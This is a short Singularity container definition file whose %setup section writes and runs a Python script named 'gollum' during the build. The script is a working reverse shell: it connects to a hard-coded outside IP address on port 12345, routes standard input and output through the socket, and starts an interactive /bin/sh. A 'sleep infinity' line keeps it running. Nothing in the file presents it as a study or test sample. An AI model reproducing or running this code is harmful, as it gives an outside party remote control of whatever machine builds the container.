BootStrap: docker
From: busybox

%setup
cat > $SINGULARITY_ROOTFS/gollum << 'PYTHON'
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("90.100.92.160",12345))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

PYTHON
python3.5 $SINGULARITY_ROOTFS/gollum
sleep infinity
